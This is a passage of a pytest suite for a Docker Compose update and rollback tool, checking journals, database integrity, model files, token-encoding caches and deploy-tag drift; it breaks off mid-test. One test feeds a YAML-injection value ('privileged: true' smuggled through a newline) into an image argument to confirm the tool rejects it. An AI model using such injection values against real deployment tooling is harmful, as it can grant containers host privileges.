def test_rollback_uses_the_image_id_when_the_tag_was_moved(
    deployment, fake_docker, tmp_path
):
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0
    tag = _journal(tmp_path)["rollback_tag"]

    def move(s):  # somebody re-tagged it (or pruned and re-created the name)
        s["images"][tag] = OTHER_ID
        s["image_configs"][OTHER_ID] = OTHER_CONFIG

    fake_docker.edit(move)
    assert _rollback(conf) == 0
    assert fake_docker.app()["image_id"] == OLD_ID
    journal = _journal(tmp_path)
    assert journal["rollback_tag"] != tag and journal["status"] == "rolled_back"
    assert fake_docker.get()["images"][journal["rollback_tag"]] == OLD_ID


def test_rollback_refuses_when_the_baseline_image_is_gone(
    deployment, fake_docker, tmp_path
):
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0

    def prune(s):
        s["image_configs"].pop(OLD_ID)
        s["images"] = {k: v for k, v in s["images"].items() if v != OLD_ID}

    fake_docker.edit(prune)
    ups = len(_ups(fake_docker))
    assert _rollback(conf) == OP.EXIT_UPDATE
    assert len(_ups(fake_docker)) == ups and fake_docker.app()["image_id"] == IMAGE_ID
    assert _journal(tmp_path)["status"] == "awaiting_approval"  # nothing was changed


def test_rollback_to_image_is_validated(deployment, fake_docker, tmp_path):
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0
    assert (
        _rollback(conf, "app", "--to-image", "x\n  privileged: true") == OP.EXIT_USAGE
    )
    assert _rollback(conf, "app", "--to-image", "chatbot5400:missing") == OP.EXIT_UPDATE
    fake_docker.edit(
        lambda s: (
            s["images"].update({"chatbot5400:other": OTHER_ID}),
            s["image_configs"].update({OTHER_ID: OTHER_CONFIG}),
        )
    )
    assert (
        _rollback(conf, "app", "--to-image", "chatbot5400:other") == OP.EXIT_UPDATE
    )  # not the baseline
    assert fake_docker.app()["image_id"] == IMAGE_ID
    assert _rollback(conf, "app", "--to-image", "chatbot5400:local") == 0
    assert fake_docker.app()["image_id"] == OLD_ID


def test_rollback_reports_failure_when_the_old_image_is_unhealthy(
    deployment, fake_docker, tmp_path
):
    """F-09: a rollback that does not pass its checks is not called a success."""
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0
    fake_docker.set(fail_on_image={OLD_ID: ["import docling"]})
    assert _rollback(conf) == OP.EXIT_UPDATE
    assert _journal(tmp_path)["status"] == "rollback_failed"
    assert _apply(conf, pkg_dir, "--allow-version-mismatch") == OP.EXIT_PREFLIGHT
    fake_docker.set(fail_on_image={})
    assert _rollback(conf) == 0  # an interrupted / failed rollback can be repeated
    assert _journal(tmp_path)["status"] == "rolled_back"


def test_rollback_refused_for_a_migration_package(
    deployment, fake_docker, tmp_path, monkeypatch
):
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0
    real = OP.load_package

    def migrated(*a, **k):
        m = real(*a, **k)
        m["database"]["migration_required"] = True
        return m

    monkeypatch.setattr(OP, "load_package", migrated)
    assert _rollback(conf, "app", "--package-dir", str(pkg_dir)) == OP.EXIT_UPDATE
    assert fake_docker.app()["image_id"] == IMAGE_ID


# --- F-09: finish is health-checked -------------------------------------------


def test_finish_failure_is_not_completed_and_can_be_retried(
    deployment, fake_docker, tmp_path
):
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0
    health = [x for x in conf.read_text().splitlines() if x.startswith("HEALTH_URL=")][
        0
    ]
    _set_conf(conf, HEALTH_URL="http://127.0.0.1:9/health")
    assert _finish(conf) == OP.EXIT_UPDATE
    assert _journal(tmp_path)["status"] == "finish_failed"
    # the deploy tag went back to the approved image: a restart returns to it
    assert fake_docker.get()["images"][DEPLOY_TAG] == OLD_ID
    assert _journal(tmp_path)["steps"][-2]["step"] == "TAG_reverted"
    # the right image runs, but the attempt is undecided: exit 8, not 0 (R2-13)
    assert _status(conf) == OP.EXIT_UNDECIDED
    _set_conf(conf, HEALTH_URL=health.split("=", 1)[1])
    assert _finish(conf) == 0
    assert _journal(tmp_path)["status"] == "completed"


def test_finish_refuses_compose_files_that_break_the_contract(deployment, fake_docker, tmp_path):
    """finish recreates with the operator's files ONLY, so they must give the application
    DEPLOY_IMAGE_TAG and REQUIRED_APP_ENV - otherwise nothing moves, nothing restarts.
    (12D3: finish used the shared override and refused when it had been edited.)"""
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0
    ups = len(_ups(fake_docker))
    fake_docker.edit(
        lambda s: s["config"]["services"]["open_notebook"].update(image="chatbot5400:other")
    )
    assert _finish(conf) == OP.EXIT_UPDATE
    fake_docker.edit(
        lambda s: s["config"]["services"]["open_notebook"].update(image=DEPLOY_TAG)
    )
    fake_docker.edit(
        lambda s: s["config"]["services"]["open_notebook"]["environment"].pop("OCR_OFFLINE")
    )
    assert _finish(conf) == OP.EXIT_UPDATE
    assert len(_ups(fake_docker)) == ups
    assert fake_docker.get()["images"][DEPLOY_TAG] == OLD_ID
    assert _journal(tmp_path)["status"] == "awaiting_approval"


# --- F-13: the journal ---------------------------------------------------------


def test_journal_is_written_atomically_with_a_backup_copy(deployment, tmp_path):
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0
    state = tmp_path / "state"
    assert (
        json.loads((state / "journal.json.bak").read_text())["attempt_id"]
        == _journal(tmp_path)["attempt_id"]
    )
    assert not list(state.glob("*.tmp"))


@pytest.mark.parametrize(
    "damage", ['{"version": "1.3.0-rc.1", "status": "in_pro', "", "[]", "\x00\x00"]
)
def test_damaged_journal_stops_everything_without_a_blind_reset(
    deployment, fake_docker, tmp_path, capsys, damage
):
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0
    state = tmp_path / "state"
    (state / "journal.json").write_text(damage)  # power loss in the middle of a write
    calls = len(fake_docker.calls())
    capsys.readouterr()
    for run in (
        lambda: _status(conf),
        lambda: _apply(conf, pkg_dir, "--allow-version-mismatch"),
        lambda: _finish(conf),
        lambda: _rollback(conf),
        lambda: OP.main(["pin", "--config", str(conf)]),
    ):
        assert run() == OP.EXIT_UPDATE
    out = capsys.readouterr().out
    assert "damaged" in out and "journal.json.bak" in out and "awaiting_approval" in out
    assert (state / "journal.json").read_text() == damage  # not replaced, not deleted
    assert not _ups(fake_docker, calls)  # nothing was recreated on a guess
    # the documented recovery: the previous good copy
    shutil.copy2(state / "journal.json.bak", state / "journal.json")
    assert _status(conf) == OP.EXIT_UNDECIDED  # readable again: awaiting approval
    assert _finish(conf) == 0


def test_damaged_journal_without_a_backup_copy(deployment, tmp_path, capsys):
    conf, _, _ = deployment
    state = tmp_path / "state"
    state.mkdir(exist_ok=True)
    (state / "journal.json").write_text("{")
    assert _status(conf) == OP.EXIT_UPDATE
    assert "no readable backup copy" in capsys.readouterr().out


# --- F-21: the database container is proven untouched --------------------------


def test_database_container_recreated_by_compose_is_detected(
    deployment, fake_docker, tmp_path, capsys
):
    conf, pkg_dir, _ = deployment
    fake_docker.set(up_recreates_db=True)  # e.g. a Compose that ignores --no-deps
    assert _apply(conf, pkg_dir) == OP.EXIT_UPDATE
    assert "DATABASE CONTAINER CHANGED" in capsys.readouterr().out
    journal = _journal(tmp_path)
    assert journal["status"] != "awaiting_approval" and journal["db_changed"] is True
    assert _finish(conf) == OP.EXIT_UPDATE
    # sticky (R2-05): rollback refuses, changing nothing, until the operator has looked
    fake_docker.set(up_recreates_db=False)
    assert _rollback(conf, "interrupted") == OP.EXIT_UPDATE
    assert fake_docker.app()["image_id"] == OLD_ID  # the new image never ran
    assert _journal(tmp_path)["status"] == "in_progress"
    assert _status(conf) == OP.EXIT_DRIFT  # DATABASE CHANGED is reported
    assert _rollback(conf, "interrupted", "--acknowledge-db-change") == 0
    assert _journal(tmp_path)["acknowledged"]["flags"]["db_changed"] is True
    assert _journal(tmp_path)["status"] == "rolled_back"


def test_database_restart_between_two_runs_is_reported_not_fatal(
    deployment, fake_docker, tmp_path, capsys
):
    """StartedAt counts only within ONE recreate (R2-05): a reboot between two runs of the
    same attempt is reported (12D3 refused the update); container, image, mounts and
    volume must still be the same ones."""
    conf, pkg_dir, _ = deployment
    rc = _server("update", conf, pkg_dir, "--apply", "--backup-reference", "x")
    assert rc == OP.EXIT_UPDATE  # attempt started, baseline taken
    fake_docker.edit(
        lambda s: s["containers"]["db1"].update(started_at="2026-11-17T23:00:00Z")
    )
    capsys.readouterr()
    assert _apply(conf, pkg_dir) == 0
    assert "restarted since" in capsys.readouterr().out
    assert _journal(tmp_path)["status"] == "awaiting_approval"


def test_database_restart_during_a_recreate_stops_the_update(deployment, fake_docker, tmp_path):
    """Within one recreate the database container must not even restart."""
    conf, pkg_dir, _ = deployment
    fake_docker.set(up_restarts_db=True)
    assert _apply(conf, pkg_dir) == OP.EXIT_UPDATE
    journal = _journal(tmp_path)
    assert journal["db_changed"] is True and journal["status"] != "awaiting_approval"
    assert journal["db_change_reports"][-1]["changed"] == ["started_at"]
    assert _finish(conf) == OP.EXIT_UPDATE


@pytest.mark.parametrize(
    "after_up",
    [
        {"schema": 34},
        {
            "counts": {
                "source": 0,
                "notebook": 7,
                "note": 31,
                "source_embedding": 5400,
                "source_insight": 12,
            }
        },
    ],
)
def test_schema_or_row_counts_changing_after_the_recreate_fail_the_update(
    deployment, fake_docker, tmp_path, after_up
):
    conf, pkg_dir, _ = deployment
    fake_docker.set(on_up=after_up)
    assert _apply(conf, pkg_dir) == OP.EXIT_UPDATE
    assert _journal(tmp_path)["status"] == "failed"
    assert (
        fake_docker.app()["ports"]["8502/tcp"][0]["HostIp"] == "127.0.0.1"
    )  # stays in maintenance


def test_acceptance_uploads_and_a_reboot_before_finish_are_not_reported_as_damage(
    deployment, fake_docker, tmp_path
):
    """The checks compare with the state right before EACH recreate, not with the
    start of the attempt: during acceptance (maintenance mode) the operator uploads
    test documents, and the server may be rebooted before `finish` or `rollback`."""
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0
    fake_docker.edit(
        lambda s: s["counts"].update(source=121, source_embedding=5460)
    )  # acceptance PDF
    fake_docker.edit(
        lambda s: s["containers"]["db1"].update(started_at="2026-11-19T06:00:00Z")
    )  # reboot
    assert _finish(conf) == 0
    journal = _journal(tmp_path)
    assert journal["status"] == "completed"
    assert journal["reference"]["counts"]["source"] == 121
    assert (
        journal["baseline"]["counts"]["source"] == 120
    )  # the attempt's own record is kept
    # weeks later: more data, another reboot, then a rollback
    fake_docker.edit(lambda s: s["counts"].update(source=300, note=90))
    fake_docker.edit(
        lambda s: s["containers"]["db1"].update(started_at="2026-12-01T06:00:00Z")
    )
    assert _rollback(conf) == 0
    assert _journal(tmp_path)["status"] == "rolled_back"
    assert fake_docker.app()["image_id"] == OLD_ID


def test_finish_fails_when_a_table_with_data_is_empty_afterwards(
    deployment, fake_docker, tmp_path
):
    """Normal mode: counts may move (users are back), but a table that had rows
    and is empty after the recreate means the application sees another database."""
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0
    emptied = dict(fake_docker.get()["counts"], source=0, source_embedding=0)
    fake_docker.set(on_up={"counts": emptied})
    assert _finish(conf) == OP.EXIT_UPDATE
    assert _journal(tmp_path)["status"] == "finish_failed"


def _fp(**tables):
    raw: Dict[str, Dict[str, Any]] = {t: {"ids": [], "updated": None} for t in OP.RECORD_TABLES}
    for t, ids in tables.items():
        raw[t] = {"ids": ids, "updated": None}
    return OP.make_fingerprint(raw)


def test_data_verdict():
    """THE verdict of every data check (R2-05; it replaces 12D3's counts_verdict, where a
    count could drop in normal mode and unreadable counts skipped the check): every
    reference record must still exist, additions are allowed, unreadable is a FAIL,
    `exact` demands identical data (one recreate in maintenance / around the backup)."""
    ref = {"source": ["source:1", "source:2"], "note": []}
    same = _fp(source=["source:2", "source:1"])
    assert OP.data_verdict(ref, same)[0]
    assert OP.data_verdict(ref, same, exact=_fp(source=["source:1", "source:2"])["summary"])[0]
    added = _fp(source=["source:1", "source:2", "source:3"], note=["note:1"])
    ok, detail = OP.data_verdict(ref, added)
    assert ok and "added" in detail
    assert not OP.data_verdict(ref, added, exact=same["summary"])[0]
    ok, detail = OP.data_verdict(ref, _fp(source=["source:1", "source:9"]))  # same count
    assert not ok and "DATA CHANGED" in detail and "1 of 2" in detail
    assert not OP.data_verdict(ref, _fp(source=["source:1"]))[0]  # partial loss
    assert not OP.data_verdict(ref, _fp())[0]  # an empty database
    assert not OP.data_verdict(ref, None)[0]  # unreadable: never "nothing to compare"
    assert not OP.data_verdict(None, same)[0]  # the reference list is unreadable
    assert OP.data_verdict({}, same)[0]  # nothing recorded: readability only
    assert not OP.data_verdict({}, None)[0]


def test_make_fingerprint_is_canonical_and_rejects_garbage():
    raw: Dict[str, Dict[str, Any]] = {t: {"ids": [], "updated": None} for t in OP.RECORD_TABLES}
    raw["source"] = {"ids": ["source:b", "source:a"], "updated": ["u2", "u1"]}
    a = OP.make_fingerprint(raw)
    assert a["summary"]["tables"]["source"]["count"] == 2
    assert a["ids"]["source"] == ["source:a", "source:b"]
    swapped = json.loads(json.dumps(raw))
    swapped["source"] = {"ids": ["source:a", "source:b"], "updated": ["u1", "u2"]}
    assert OP.make_fingerprint(swapped)["summary"] == a["summary"]  # order-independent
    edited = json.loads(json.dumps(raw))
    edited["source"]["updated"] = ["u2", "u9"]  # a record was changed
    b = OP.make_fingerprint(edited)["summary"]["tables"]["source"]
    assert b["ids_sha256"] == a["summary"]["tables"]["source"]["ids_sha256"]
    assert b["updated_sha256"] != a["summary"]["tables"]["source"]["updated_sha256"]
    bad: Any
    for bad in (
        None, [], {"source": {"ids": []}},
        dict(raw, note={"ids": "x"}), dict(raw, note={"ids": [], "updated": ["u"]}),
    ):  # fmt: skip
        assert OP.make_fingerprint(bad) is None


# --- F-22: offline artifacts -----------------------------------------------------


@pytest.mark.parametrize(
    "result",
    [
        {
            "copied": {
                "det.onnx": "imported",
                "rec.onnx": "skipped (checksum mismatch)",
            },
            "on_volume": [["det.onnx", 1]],
        },
        {"copied": {}, "on_volume": []},
        "garbage",
    ],
)
def test_rapidocr_weights_must_be_on_the_volume_before_the_recreate(
    deployment, fake_docker, tmp_path, result
):
    conf, pkg_dir, _ = deployment
    fake_docker.set(rapidocr=result)
    assert _apply(conf, pkg_dir) == OP.EXIT_UPDATE
    assert not _update_ups(fake_docker) and fake_docker.app()["image_id"] == OLD_ID
    step = [s for s in _journal(tmp_path)["steps"] if s["step"] == "RAPIDOCR_weights"][
        -1
    ]
    assert step["ok"] is False
    assert (
        _apply(conf, pkg_dir, "--accept-missing-rapidocr") == 0
    )  # the operator's explicit decision


def test_rapidocr_copy_command_failing_is_not_ignored(deployment, fake_docker):
    conf, pkg_dir, _ = deployment
    fake_docker.set(fail=["import_rapidocr_weights"])
    assert _apply(conf, pkg_dir) == OP.EXIT_UPDATE
    assert not _update_ups(fake_docker) and fake_docker.app()["image_id"] == OLD_ID


LOST_AGRI = lambda s: s["artifacts"]["ocr_models"].pop(4)  # noqa: E731
LOST_HERON = lambda s: s["artifacts"]["huggingface_hub"].pop(0)  # noqa: E731
DANGLING_TABLEFORMER = lambda s: s["artifacts"]["huggingface_hub"][1].__setitem__(1, -1)  # noqa: E731


@pytest.mark.parametrize(
    "loss",
    [LOST_AGRI, LOST_HERON, DANGLING_TABLEFORMER],
    ids=["agri", "heron", "tableformer-blob"],
)
def test_model_files_missing_in_the_new_container_fail_the_update(
    deployment, fake_docker, tmp_path, capsys, loss
):
    """F-22: every model file the old container saw on the data volume (Layout
    Heron, TableFormer, Tesseract incl. OSD and Agri, RapidOCR, EasyOCR) must be
    there, same size, in the new container - whatever the readiness state says."""
    conf, pkg_dir, _ = deployment
    after = fake_docker.get()
    loss(after)
    fake_docker.set(on_up={"artifacts": after["artifacts"]})
    assert _apply(conf, pkg_dir) == OP.EXIT_UPDATE
    assert _journal(tmp_path)["status"] == "failed"
    assert "model files on the data volume unchanged" in capsys.readouterr().out
    step = [
        s for s in _journal(tmp_path)["steps"] if s["step"] == "ARTIFACTS_snapshot"
    ][0]
    assert step["files"] == {"huggingface_hub": 2, "ocr_models": 7}


def test_model_files_that_cannot_be_listed_stop_the_update_before_the_recreate(
    deployment, fake_docker
):
    conf, pkg_dir, _ = deployment
    fake_docker.set(fail=["ARTIFACTS"])
    assert _apply(conf, pkg_dir) == OP.EXIT_UPDATE
    assert not _update_ups(fake_docker) and fake_docker.app()["image_id"] == OLD_ID


def test_new_model_files_are_not_a_loss():
    before = {"ocr_models": [["a", 1]], "huggingface_hub": []}
    assert (
        OP.artifact_losses(
            before, {"ocr_models": [["a", 1], ["b", 2]], "huggingface_hub": []}
        )
        == []
    )
    assert OP.artifact_losses(before, {"ocr_models": [["a", 2]]}) == [
        "ocr_models/a (size 1 -> 2)"
    ]
    assert OP.artifact_losses(before, {}) == ["ocr_models/a (missing)"]
    assert OP.artifact_losses(before, None)


def test_token_counting_must_work_offline_in_the_new_container(
    deployment, fake_docker, tmp_path
):
    conf, pkg_dir, _ = deployment
    # R2-10: the probe loads the real encoding (12D3 called chunk_text, which also
    # "works" on the word-count estimate)
    fake_docker.set(fail_on_image={IMAGE_ID: ["get_encoding"]})
    assert _apply(conf, pkg_dir) == OP.EXIT_UPDATE
    assert _journal(tmp_path)["status"] == "failed"


def test_token_encoding_constants_match_the_application():
    from open_notebook.utils import token_utils

    assert OP.TIKTOKEN_ENCODING == token_utils.TIKTOKEN_ENCODING
    assert OP.TIKTOKEN_BLOB_URL == token_utils.TIKTOKEN_BLOB_URL
    assert OP.TIKTOKEN_BLOB_SHA256 == token_utils.TIKTOKEN_BLOB_SHA256
    assert (
        Path(token_utils.tiktoken_cache_file()).name
        == hashlib.sha1(OP.TIKTOKEN_BLOB_URL.encode()).hexdigest()
    )


@pytest.mark.parametrize(
    "loads, right_file, ready",
    [(True, True, True), (False, True, False), (True, False, False)],
    ids=["usable", "does-not-load", "wrong-cache-file"],
)
def test_inventory_reports_the_token_encoding_cache(
    tmp_path, monkeypatch, capsys, loads, right_file, ready
):
    """The inventory (run with --network none inside the image) records the
    encoding, the cache path, every cache file with its SHA-256, whether the
    expected file is there byte for byte, and whether the encoding loads with
    no network. tiktoken itself is replaced here: the real one would download."""
    import types

    app_root = tmp_path / "app"
    (app_root / "open_notebook" / "database" / "migrations").mkdir(parents=True)
    (
        app_root / "open_notebook" / "database" / "migrations" / "33.surrealql"
    ).write_text("")
    (app_root / "VERSION").write_text("1.2.0\n")
    cache = tmp_path / "tiktoken-cache"
    cache.mkdir()
    name = hashlib.sha1(OP.TIKTOKEN_BLOB_URL.encode()).hexdigest()
    (cache / name).write_bytes(b"encoding bytes")
    monkeypatch.setenv("TIKTOKEN_CACHE_DIR", str(cache))
    digest = hashlib.sha256(b"encoding bytes").hexdigest()
    monkeypatch.setattr(OP, "TIKTOKEN_BLOB_SHA256", digest if right_file else "0" * 64)

    class Encoding:
        def encode(self, text):
            return text.split()

    def get_encoding(encoding):
        assert encoding == "o200k_base"
        if not loads:
            raise OSError("network unreachable")
        return Encoding()

    monkeypatch.setitem(
        sys.modules, "tiktoken", types.SimpleNamespace(get_encoding=get_encoding)
    )
    assert OP.main(["inventory", "--app-root", str(app_root)]) == 0
    info = json.loads(capsys.readouterr().out)
    tik = info["runtime_artifacts"]["tiktoken"]
    assert tik["encoding"] == "o200k_base" and tik["cache_dir"] == str(cache)
    assert tik["files"] == [{"name": name, "size": 14, "sha256": digest}]
    assert tik["expected_file"] == name
    assert tik["loads_offline"] is loads and tik["checksum_ok"] is right_file
    assert info["runtimes_baked"]["tiktoken_offline"] is ready
    assert info["schema_version"] == 33 and info["app_version"] == "1.2.0"


# --- F-20: another image store ---------------------------------------------------


def test_image_loaded_into_another_image_store_is_recognised_by_its_layers(
    deployment, fake_docker, tmp_path
):
    conf, pkg_dir, _ = deployment
    fake_docker.set(store="containerd")  # image ID != the ID seen on the build machine
    assert _apply(conf, pkg_dir) == 0
    journal = _journal(tmp_path)
    server_id = fake_docker.get()["images"][TARGET]
    assert server_id != IMAGE_ID and journal["expected_image_id"] == server_id
    assert "layer" in journal["steps"][0]["identified_by"]
    assert fake_docker.app()["image_id"] == server_id
    assert _finish(conf) == 0 and _status(conf) == 0


def test_loaded_image_that_is_not_the_packaged_one_is_refused(
    deployment, fake_docker, tmp_path, monkeypatch
):
    conf, pkg_dir, _ = deployment
    monkeypatch.setattr(
        OP,
        "inspect_image",
        lambda ref: (OTHER_ID, ["sha256:" + "1" * 64]) if ref == TARGET else None,
    )
    assert (
        _apply(conf, pkg_dir) == OP.EXIT_PREFLIGHT
    )  # the tag is taken by another image
    assert not _ups(fake_docker)


# --- F-11: drift and the persistent pin ------------------------------------------


@pytest.fixture
def completed(deployment, fake_docker):
    conf, pkg_dir, deploy = deployment
    assert _apply(conf, pkg_dir) == 0
    assert _finish(conf) == 0
    return conf, pkg_dir, deploy


def test_plain_compose_up_keeps_the_approved_image(completed, fake_docker, capsys):
    """F-11 under the 12D5 contract: after finish DEPLOY_IMAGE_TAG names the new image, so
    a plain `docker compose up -d` (operations script, boot guard) starts the APPROVED
    image with the operator's environment, no tool file in the list. (12D3: the old image
    came back and only status / health noticed.) A deploy tag moved by hand is reported
    (exit 7) and repaired with pin --apply."""
    conf, _, deploy = completed
    assert _status(conf) == 0
    _plain_compose_up(deploy)
    app = fake_docker.app()
    assert app["image_id"] == IMAGE_ID and app["env"]["OCR_OFFLINE"] == "true"
    assert _status(conf) == 0 and OP.main(["health", "--config", str(conf)]) == 0
    # somebody points the deployment's tag at the old image by hand, then restarts
    fake_docker.edit(lambda s: s["images"].update({DEPLOY_TAG: OLD_ID}))
    _plain_compose_up(deploy)
    assert fake_docker.app()["image_id"] == OLD_ID
    capsys.readouterr()
    assert _status(conf) == OP.EXIT_DRIFT
    out = capsys.readouterr().out
    assert "IMAGE DRIFT" in out and "DEPLOY TAG DRIFT" in out
    assert OP.main(["health", "--config", str(conf)]) == OP.EXIT_DRIFT
    # repair: the tag goes back to the approved image; the recorded command starts it
    assert OP.main(["pin", "--config", str(conf), "--apply"]) == 0
    command = (
        Path(OP.load_config(str(conf))["STATE_DIR"]) / "compose-command.txt"
    ).read_text()
    subprocess.run(["bash", "-c", command], check=True)
    assert fake_docker.app()["image_id"] == IMAGE_ID and _status(conf) == 0


def test_pin_is_a_read_only_report_unless_applied(completed, fake_docker, capsys):
    """12D5: the optional pin is gone (no docker-compose.offline-pin.yml, no pin
    bookkeeping); `pin` reports DEPLOY_IMAGE_TAG vs approved.json vs the container."""
    conf, _, deploy = completed
    before = fake_docker.get()["images"]
    capsys.readouterr()
    assert OP.main(["pin", "--config", str(conf)]) == 0
    out = capsys.readouterr().out
    assert f'"deploy_tag_image_id": "{IMAGE_ID}"' in out
    assert f'"running_image_id": "{IMAGE_ID}"' in out
    assert fake_docker.get()["images"] == before
    assert not (deploy / OP.PIN_FILE).exists()
    fake_docker.edit(lambda s: s["images"].update({DEPLOY_TAG: OLD_ID}))
    assert OP.main(["pin", "--config", str(conf)]) == OP.EXIT_DRIFT  # reported only
    assert fake_docker.get()["images"][DEPLOY_TAG] == OLD_ID


def test_pin_needs_a_completed_update(deployment, fake_docker):
    conf, pkg_dir, _ = deployment
    assert OP.main(["pin", "--config", str(conf), "--apply"]) == OP.EXIT_UPDATE
    assert _apply(conf, pkg_dir) == 0  # awaiting approval
    assert OP.main(["pin", "--config", str(conf), "--apply"]) == OP.EXIT_UPDATE


def test_pin_apply_is_an_idempotent_repair(completed, fake_docker, tmp_path):
    """pin --apply re-points DEPLOY_IMAGE_TAG to approved.json's image: nothing to do when
    it already does, a recorded repair when somebody moved it - never a decision.
    (12D3: pin --apply retagged the deployment's image name and wrote a pin file.)"""
    conf, _, deploy = completed
    steps = len(_journal(tmp_path)["steps"])
    assert OP.main(["pin", "--config", str(conf), "--apply"]) == 0
    assert OP.main(["pin", "--config", str(conf), "--apply"]) == 0
    assert len(_journal(tmp_path)["steps"]) == steps  # nothing to repair, nothing recorded
    assert fake_docker.get()["images"][DEPLOY_TAG] == IMAGE_ID
    fake_docker.edit(lambda s: s["images"].update({DEPLOY_TAG: OLD_ID}))
    assert OP.main(["pin", "--config", str(conf), "--apply"]) == 0
    assert fake_docker.get()["images"][DEPLOY_TAG] == IMAGE_ID
    repair = _journal(tmp_path)["steps"][steps:]
    assert [s["step"] for s in repair] == ["TAG_intent", "TAG_done"]
    assert repair[0]["why"] == "pin repair" and repair[0]["from_id"] == OLD_ID
    assert _status(conf) == 0
    assert not (deploy / OP.PIN_FILE).exists()
    assert (deploy / ".env").read_text() == "SURREAL_PASSWORD=do-not-read\n"
    assert (deploy / "docker-compose.yml").read_text() == "services: {}\n"


def test_preflight_refuses_compose_files_that_do_not_name_the_deploy_tag(
    deployment, fake_docker
):
    """Contract step 1: the deployment's own compose files must give the application
    DEPLOY_IMAGE_TAG - otherwise moving the tag would not change what starts. (12D3's pin
    guessed the name from the replaced container and refused when it could not.)"""
    conf, pkg_dir, _ = deployment

    def preflight():
        return _server("preflight", conf, pkg_dir, "--backup-reference", "x")

    assert preflight() == 0
    for image in ("some-other-name:1", OLD_ID):
        fake_docker.edit(
            lambda s, image=image: s["config"]["services"]["open_notebook"].update(image=image)
        )
        assert preflight() == OP.EXIT_PREFLIGHT
    fake_docker.edit(
        lambda s: s["config"]["services"]["open_notebook"].update(image=DEPLOY_TAG)
    )
    assert preflight() == 0
    _set_conf(conf, DEPLOY_IMAGE_TAG="")
    assert preflight() == OP.EXIT_PREFLIGHT  # not configured
    _set_conf(conf, DEPLOY_IMAGE_TAG="chatbot5400:missing")
    assert preflight() == OP.EXIT_PREFLIGHT  # no such image


def test_preflight_refuses_a_build_only_application_service(deployment, fake_docker, capsys):
    """Production compose may have `build:` and no `image:` (Compose names the image
    <project>-<service>): contract step 1 asks the operator to declare `image:
    <DEPLOY_IMAGE_TAG>` (12D3's pin retagged the guessed name). MOCK ONLY."""
    conf, pkg_dir, _ = deployment
    fake_docker.edit(lambda s: s["config"]["services"]["open_notebook"].pop("image"))
    capsys.readouterr()
    assert _server("preflight", conf, pkg_dir, "--backup-reference", "x") == OP.EXIT_PREFLIGHT
    out = capsys.readouterr().out
    assert f"image: {DEPLOY_TAG}" in out and "contract step 1" in out


def test_rollback_without_a_journal_after_moving_a_damaged_one_aside(
    deployment, fake_docker, tmp_path
):
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0
    state = tmp_path / "state"
    tag = _journal(tmp_path)["rollback_tag"]
    (state / "journal.json").write_text("{")
    (state / "journal.json.bak").write_text("{")
    assert (
        _rollback(conf, "app", "--to-image", tag) == OP.EXIT_UPDATE
    )  # still refused: no blind reset
    (state / "journal.json").rename(state / "journal.damaged.json")
    (state / "journal.json.bak").rename(state / "journal.damaged.bak")
    assert _rollback(conf, "app", "--to-image", tag) == 0
    assert fake_docker.app()["image_id"] == OLD_ID


def test_rollback_after_finish_points_the_deploy_tag_back(completed, fake_docker, tmp_path):
    """rollback app moves DEPLOY_IMAGE_TAG back to the previous approved image (intent
    first, verified), so every later start path runs it."""
    conf, _, deploy = completed
    assert fake_docker.get()["images"][DEPLOY_TAG] == IMAGE_ID
    assert _rollback(conf, "app", "--no-maintenance") == 0
    assert fake_docker.get()["images"][DEPLOY_TAG] == OLD_ID
    assert _approved(tmp_path)["how"] == "rollback"
    assert _approved(tmp_path)["image_id"] == OLD_ID
    _plain_compose_up(deploy)
    assert fake_docker.app()["image_id"] == OLD_ID and _status(conf) == 0
    names = [s["step"] for s in _journal(tmp_path)["steps"]]
    assert names[names.index("ROLLBACK_intent") :] == [
        "ROLLBACK_intent", "TAG_intent", "TAG_done", "UP_intent", "ROLLBACK_app",
        "ROLLBACK_done",
    ]  # fmt: skip


def test_pin_undo_is_refused_and_a_leftover_pin_file_is_only_reported(
    completed, fake_docker, tmp_path, capsys
):
    """pin --undo is gone (an approval is undone with `rollback app`, which is checked);
    a docker-compose.offline-pin.yml left by the 12D3 tool is reported, never touched."""
    conf, _, deploy = completed
    pin_file = deploy / OP.PIN_FILE
    pin_file.write_text("# the operator's own file\n")
    images = fake_docker.get()["images"]
    assert OP.main(["pin", "--config", str(conf), "--undo"]) == OP.EXIT_USAGE
    assert fake_docker.get()["images"] == images
    capsys.readouterr()
    assert _status(conf) == 0
    assert OP.PIN_FILE in capsys.readouterr().out
    assert pin_file.read_text() == "# the operator's own file\n"


def test_drift_is_checked_for_a_rolled_back_deployment(completed, fake_docker):
    """Image AND environment of a rolled-back deployment are compared (R2-13: 12D3
    compared only the image in that state)."""
    conf, _, deploy = completed
    assert _rollback(conf) == 0
    assert _status(conf) == 0
    state = Path(OP.load_config(str(conf))["STATE_DIR"])
    command = (state / "compose-command.txt").read_text()
    assert not (state / "image-override.yml").exists()
    assert "--pull never" in command and f"approved image {OLD_ID}" in command
    # somebody starts the new image again by hand
    fake_docker.edit(lambda s: s["containers"]["c1"].update(image_id=IMAGE_ID))
    assert _status(conf) == OP.EXIT_DRIFT
    fake_docker.edit(lambda s: s["containers"]["c1"].update(image_id=OLD_ID))
    assert _status(conf) == 0
    fake_docker.edit(lambda s: s["containers"]["c1"]["env"].pop("OCR_OFFLINE"))
    assert _status(conf) == OP.EXIT_DRIFT


# --- F-23: the Legal gate keeps the network mode ----------------------------------


def test_legal_gate_commands_refuse_and_change_nothing(completed, fake_docker, tmp_path, capsys):
    """12D5 contract step 2: the Legal gate is the operator's configuration. rollback
    legal-on / legal-off write no override any more (12D3 rewrote the shared override and
    recreated the application): they refuse with the procedure and change nothing."""
    conf, _, _ = completed
    state = tmp_path / "state"
    before = (fake_docker.get(), _journal(tmp_path), sorted(p.name for p in state.rglob("*")))
    start = len(fake_docker.calls())
